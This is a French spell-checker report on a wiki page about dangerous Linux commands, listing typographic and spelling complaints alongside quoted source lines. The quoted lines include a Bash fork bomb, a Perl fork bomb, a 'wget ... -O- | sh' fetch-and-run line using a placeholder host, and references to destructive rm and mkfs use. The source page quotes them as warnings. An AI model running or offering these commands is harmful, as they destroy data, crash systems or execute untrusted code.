
5 Espace(s) en fin de ligne à supprimer. => ====== Les commandes dangereuses ======  |   => suggestions : ['']

8 Espace(s) en début de ligne à supprimer : utilisez les retraits de paragraphe (ou les tabulations à la rigueur). =>   |   => suggestions : ['']

16 Guillemets typographiques ouvrants. => <note >Les "QUELQUE_CHOSE", "QUELQUE_COMMANDE" et "QUELQUE_CHOSE_IMPORTANT" indiqués dans les commandes pouvant être remplacés par n'importe quelle chaîne de caractères.</note> | " => suggestions : ['«\xa0', '“']
16 Mot inconnu : QUELQUE_CHOSE => <note >Les "QUELQUE_CHOSE", "QUELQUE_COMMANDE" et "QUELQUE_CHOSE_IMPORTANT" indiqués dans les commandes pouvant être remplacés par n'importe quelle chaîne de caractères.</note> | quelque_chose
16 Guillemets typographiques fermants. => <note >Les "QUELQUE_CHOSE", "QUELQUE_COMMANDE" et "QUELQUE_CHOSE_IMPORTANT" indiqués dans les commandes pouvant être remplacés par n'importe quelle chaîne de caractères.</note> | " => suggestions : ['\xa0»', '”']
16 Guillemets typographiques ouvrants. => <note >Les "QUELQUE_CHOSE", "QUELQUE_COMMANDE" et "QUELQUE_CHOSE_IMPORTANT" indiqués dans les commandes pouvant être remplacés par n'importe quelle chaîne de caractères.</note> | " => suggestions : ['«\xa0', '“']
16 Mot inconnu : QUELQUE_COMMANDE => <note >Les "QUELQUE_CHOSE", "QUELQUE_COMMANDE" et "QUELQUE_CHOSE_IMPORTANT" indiqués dans les commandes pouvant être remplacés par n'importe quelle chaîne de caractères.</note> | quelque_commande
16 Guillemets typographiques fermants. => <note >Les "QUELQUE_CHOSE", "QUELQUE_COMMANDE" et "QUELQUE_CHOSE_IMPORTANT" indiqués dans les commandes pouvant être remplacés par n'importe quelle chaîne de caractères.</note> | " => suggestions : ['\xa0»', '”']
16 Guillemets typographiques ouvrants. => <note >Les "QUELQUE_CHOSE", "QUELQUE_COMMANDE" et "QUELQUE_CHOSE_IMPORTANT" indiqués dans les commandes pouvant être remplacés par n'importe quelle chaîne de caractères.</note> | " => suggestions : ['«\xa0', '“']
16 Mot inconnu : QUELQUE_CHOSE_IMPORTANT => <note >Les "QUELQUE_CHOSE", "QUELQUE_COMMANDE" et "QUELQUE_CHOSE_IMPORTANT" indiqués dans les commandes pouvant être remplacés par n'importe quelle chaîne de caractères.</note> | quelque_chose_important
16 Guillemets typographiques fermants. => <note >Les "QUELQUE_CHOSE", "QUELQUE_COMMANDE" et "QUELQUE_CHOSE_IMPORTANT" indiqués dans les commandes pouvant être remplacés par n'importe quelle chaîne de caractères.</note> | " => suggestions : ['\xa0»', '”']

19 Mot inconnu : linux => Sous linux avec un terminal on peut tout faire, absolument tout. Donc lisez bien ceci : | linux
20 Espace(s) en fin de ligne à supprimer. => Le danger de ces commandes est tout à fait évident :  |   => suggestions : ['']

44 Guillemets typographiques ouvrants. => ainsi que toutes les variantes commençant par 'rm' et 'mv' et se terminant par /dev/null | ' => suggestions : ['“', '‘', '‹']
44 Mot inconnu : rm => ainsi que toutes les variantes commençant par 'rm' et 'mv' et se terminant par /dev/null | rm
44 Guillemets typographiques fermants. => ainsi que toutes les variantes commençant par 'rm' et 'mv' et se terminant par /dev/null | ' => suggestions : ['”', '’', '›']
44 Guillemets typographiques ouvrants. => ainsi que toutes les variantes commençant par 'rm' et 'mv' et se terminant par /dev/null | ' => suggestions : ['“', '‘', '‹']
44 Mot inconnu : mv => ainsi que toutes les variantes commençant par 'rm' et 'mv' et se terminant par /dev/null | mv
44 Guillemets typographiques fermants. => ainsi que toutes les variantes commençant par 'rm' et 'mv' et se terminant par /dev/null | ' => suggestions : ['”', '’', '›']

47 Espace(s) en début de ligne à supprimer : utilisez les retraits de paragraphe (ou les tabulations à la rigueur). =>   * rm est la commande de suppression des fichiers sous Gnu/Linux, rm quelque chose supprimera ce quelque chose, imaginez que vous supprimez tous vos fichiers système ( racine / ) , ou vos fichier personnels ( /home/<votreidentifiant/ ) ! |    => suggestions : ['']
47 Mot inconnu : rm =>   * rm est la commande de suppression des fichiers sous Gnu/Linux, rm quelque chose supprimera ce quelque chose, imaginez que vous supprimez tous vos fichiers système ( racine / ) , ou vos fichier personnels ( /home/<votreidentifiant/ ) ! | rm
47 Mot inconnu : Gnu =>   * rm est la commande de suppression des fichiers sous Gnu/Linux, rm quelque chose supprimera ce quelque chose, imaginez que vous supprimez tous vos fichiers système ( racine / ) , ou vos fichier personnels ( /home/<votreidentifiant/ ) ! | gnu
47 Mot inconnu : rm =>   * rm est la commande de suppression des fichiers sous Gnu/Linux, rm quelque chose supprimera ce quelque chose, imaginez que vous supprimez tous vos fichiers système ( racine / ) , ou vos fichier personnels ( /home/<votreidentifiant/ ) ! | rm
47 Pas d’espace après ce signe. =>   * rm est la commande de suppression des fichiers sous Gnu/Linux, rm quelque chose supprimera ce quelque chose, imaginez que vous supprimez tous vos fichiers système ( racine / ) , ou vos fichier personnels ( /home/<votreidentifiant/ ) ! | (  => suggestions : ['(']
47 Pas d’espace avant ce signe. =>   * rm est la commande de suppression des fichiers sous Gnu/Linux, rm quelque chose supprimera ce quelque chose, imaginez que vous supprimez tous vos fichiers système ( racine / ) , ou vos fichier personnels ( /home/<votreidentifiant/ ) ! |  ) => suggestions : [')']
47 Pas d’espace avant une virgule. =>   * rm est la commande de suppression des fichiers sous Gnu/Linux, rm quelque chose supprimera ce quelque chose, imaginez que vous supprimez tous vos fichiers système ( racine / ) , ou vos fichier personnels ( /home/<votreidentifiant/ ) ! |  , => suggestions : [',']
47 Accord de nombre erroné : « fichier » devrait être au pluriel. =>   * rm est la commande de suppression des fichiers sous Gnu/Linux, rm quelque chose supprimera ce quelque chose, imaginez que vous supprimez tous vos fichiers système ( racine / ) , ou vos fichier personnels ( /home/<votreidentifiant/ ) ! | fichier => suggestions : ['fichiers']
47 Pas d’espace après ce signe. =>   * rm est la commande de suppression des fichiers sous Gnu/Linux, rm quelque chose supprimera ce quelque chose, imaginez que vous supprimez tous vos fichiers système ( racine / ) , ou vos fichier personnels ( /home/<votreidentifiant/ ) ! | (  => suggestions : ['(']
47 Mot inconnu : votreidentifiant =>   * rm est la commande de suppression des fichiers sous Gnu/Linux, rm quelque chose supprimera ce quelque chose, imaginez que vous supprimez tous vos fichiers système ( racine / ) , ou vos fichier personnels ( /home/<votreidentifiant/ ) ! | votreidentifiant
47 Pas d’espace avant ce signe. =>   * rm est la commande de suppression des fichiers sous Gnu/Linux, rm quelque chose supprimera ce quelque chose, imaginez que vous supprimez tous vos fichiers système ( racine / ) , ou vos fichier personnels ( /home/<votreidentifiant/ ) ! |  ) => suggestions : [')']

50 Forme interrogative ? Mettez un trait d’union. => Assurez vous que : | assurez vous => suggestions : ['Assurez-vous']

51 Espace(s) en début de ligne à supprimer : utilisez les retraits de paragraphe (ou les tabulations à la rigueur). =>   * un avertissement vous prévient et vous en assumerez les conséquences en cas de perte de données. |    => suggestions : ['']

52 Espace(s) en début de ligne à supprimer : utilisez les retraits de paragraphe (ou les tabulations à la rigueur). =>   * la documentation est bien claire, bien rédigée, explicite. |    => suggestions : ['']

56 Mot inconnu : mv => Vous pouvez aussi utiliser la commande mv ( déplacer ) | mv
56 Pas d’espace après ce signe. => Vous pouvez aussi utiliser la commande mv ( déplacer ) | (  => suggestions : ['(']
56 Pas d’espace avant ce signe. => Vous pouvez aussi utiliser la commande mv ( déplacer ) |  ) => suggestions : [')']

61 Mot inconnu : jpeg => Suppression du fichier labrador.jpeg (une image) | jpeg
72 Mot inconnu : NAUTILUS => Règle n° 2 : NE JAMAIS ou du moins LE MOINS POSSIBLE OUVRIR NAUTILUS (LE GESTIONNAIRE DE FICHIERS) EN MODE SUPER UTILISATEUR (ROOT) VOUS POURRIEZ PERDRE VOS DONNÉES ET ENDOMMAGER VOTRE SYSTÈME.</note> | nautilus
72 Mot inconnu : ROOT => Règle n° 2 : NE JAMAIS ou du moins LE MOINS POSSIBLE OUVRIR NAUTILUS (LE GESTIONNAIRE DE FICHIERS) EN MODE SUPER UTILISATEUR (ROOT) VOUS POURRIEZ PERDRE VOS DONNÉES ET ENDOMMAGER VOTRE SYSTÈME.</note> | root

74 Espace(s) en début de ligne à supprimer : utilisez les retraits de paragraphe (ou les tabulations à la rigueur). =>   * La commande find peut aussi être dangereuse, avec son paramètre -exec qui permet d'exécuter une commande sur le résultat d'une recherche. |    => suggestions : ['']
74 Mot inconnu : find =>   * La commande find peut aussi être dangereuse, avec son paramètre -exec qui permet d'exécuter une commande sur le résultat d'une recherche. | find
74 Il manque un espace à côté du tiret. =>   * La commande find peut aussi être dangereuse, avec son paramètre -exec qui permet d'exécuter une commande sur le résultat d'une recherche. |  - => suggestions : [' – ', ' — ']
74 Mot inconnu : exec =>   * La commande find peut aussi être dangereuse, avec son paramètre -exec qui permet d'exécuter une commande sur le résultat d'une recherche. | exec
75 Accord de nombre erroné : « suppressions » devrait être au singulier. => Par exemple, la commande suivante est très dangereuse : elle provoque la suppressions de tous les fichiers. | suppressions => suggestions : ['suppression']

77 Mot inconnu : rm => De même pour **rm** qui est utilisé. | rm

80 Mot inconnu : mkfs => Les données sur le périphérique mentionné après la commande mkfs seront détruites et remplacées par un système de fichier vide :  | mkfs
80 Espace(s) en fin de ligne à supprimer. => Les données sur le périphérique mentionné après la commande mkfs seront détruites et remplacées par un système de fichier vide :  |   => suggestions : ['']
90 Espace(s) en fin de ligne à supprimer. => Écrit des données sur le périphérique et peut entraîner la perte totale des données :  |   => suggestions : ['']

97 Mot inconnu : Forkbomb => ===== Forkbomb ===== | forkbomb

101 Mot inconnu : Bash => Avec le shell Bash :  | bash
101 Espace(s) en fin de ligne à supprimer. => Avec le shell Bash :  |   => suggestions : ['']

103 Espace(s) en début de ligne à supprimer : utilisez les retraits de paragraphe (ou les tabulations à la rigueur). =>   :(){:|:&};: |    => suggestions : ['']
103 Une de ces ponctuations est superflue. =>   :(){:|:&};: | ;: => suggestions : [';', ':']

107 Espace(s) en début de ligne à supprimer : utilisez les retraits de paragraphe (ou les tabulations à la rigueur). =>   perl -e "fork while fork" |    => suggestions : ['']
107 Mot inconnu : perl =>   perl -e "fork while fork" | perl
107 Il manque un espace à côté du tiret. =>   perl -e "fork while fork" |  - => suggestions : [' – ', ' — ']
107 Guillemets typographiques ouvrants. =>   perl -e "fork while fork" | " => suggestions : ['«\xa0', '“']
107 Mot inconnu : while =>   perl -e "fork while fork" | while
107 Guillemets typographiques fermants. =>   perl -e "fork while fork" | " => suggestions : ['\xa0»', '”']

111 Mot inconnu : Tarbomb => ===== Tarbomb ===== | tarbomb

113 Mot inconnu : tar => Quelqu'un vous demande d'extraire une archive dans un répertoire existant. Cette archive tar peut être conçue pour exploser en un grand nombre de fichiers, voire écraser les fichiers de l'utilisateur qui portent le même nom que ceux de l'archive. Vous devriez donc prendre l'habitude de décompresser des tar dans un nouveau répertoire vide. | tar
113 Mot inconnu : tar => Quelqu'un vous demande d'extraire une archive dans un répertoire existant. Cette archive tar peut être conçue pour exploser en un grand nombre de fichiers, voire écraser les fichiers de l'utilisateur qui portent le même nom que ceux de l'archive. Vous devriez donc prendre l'habitude de décompresser des tar dans un nouveau répertoire vide. | tar

115 Mot inconnu : tar => <note important>On parle ici de fichiers tar, mais c'est valable pour tous les formats de compression existant (zip, gzip, tar-gz etc...)</note> | tar
115 Mot inconnu : gzip => <note important>On parle ici de fichiers tar, mais c'est valable pour tous les formats de compression existant (zip, gzip, tar-gz etc...)</note> | gzip
115 Mot inconnu : tar-gz => <note important>On parle ici de fichiers tar, mais c'est valable pour tous les formats de compression existant (zip, gzip, tar-gz etc...)</note> | tar-gz
115 Avant « etc. », il faut mettre une virgule. => <note important>On parle ici de fichiers tar, mais c'est valable pour tous les formats de compression existant (zip, gzip, tar-gz etc...)</note> |  etc. => suggestions : [', etc.']
115 Un seul point après « etc. » => <note important>On parle ici de fichiers tar, mais c'est valable pour tous les formats de compression existant (zip, gzip, tar-gz etc...)</note> | etc... => suggestions : ['etc.']

116 Mot inconnu : Decompression => ===== Decompression bomb ===== | decompression
116 Mot inconnu : bomb => ===== Decompression bomb ===== | bomb
122 Espace(s) en fin de ligne à supprimer. => Quelqu'un vous donne le lien vers un script shell à exécuter. Il peut contenir n'importe quelle commande (bénigne ou malveillante). Vous ne devriez pas exécuter du code de personnes à qui vous ne faites pas confiance :  |   => suggestions : ['']

124 Espace(s) en début de ligne à supprimer : utilisez les retraits de paragraphe (ou les tabulations à la rigueur). =>   wget http://une_adresse/un_fichier |    => suggestions : ['']
124 Mot inconnu : wget =>   wget http://une_adresse/un_fichier | wget

125 Espace(s) en début de ligne à supprimer : utilisez les retraits de paragraphe (ou les tabulations à la rigueur). =>   sh ./un_fichier |    => suggestions : ['']
125 Mot inconnu : sh =>   sh ./un_fichier | sh
125 Mot inconnu : un_fichier =>   sh ./un_fichier | un_fichier

127 Espace(s) en début de ligne à supprimer : utilisez les retraits de paragraphe (ou les tabulations à la rigueur). =>   wget http://une_adresse/un_fichier -O- | sh |    => suggestions : ['']
127 Mot inconnu : wget =>   wget http://une_adresse/un_fichier -O- | sh | wget
127 Il manque un espace à côté du tiret. =>   wget http://une_adresse/un_fichier -O- | sh |  - => suggestions : [' – ', ' — ']
127 Mot inconnu : sh =>   wget http://une_adresse/un_fichier -O- | sh | sh

131 Guillemets typographiques ouvrants. => Une fois ce script lancé, vous avez une "chance" sur 6 pour que tous les fichiers à la racine de votre système soient effacés. Faites attention à ce script et ses variantes ! | " => suggestions : ['«\xa0', '“']
131 Guillemets typographiques fermants. => Une fois ce script lancé, vous avez une "chance" sur 6 pour que tous les fichiers à la racine de votre système soient effacés. Faites attention à ce script et ses variantes ! | " => suggestions : ['\xa0»', '”']

138 Espace(s) en fin de ligne à supprimer. => </code>  |   => suggestions : ['']

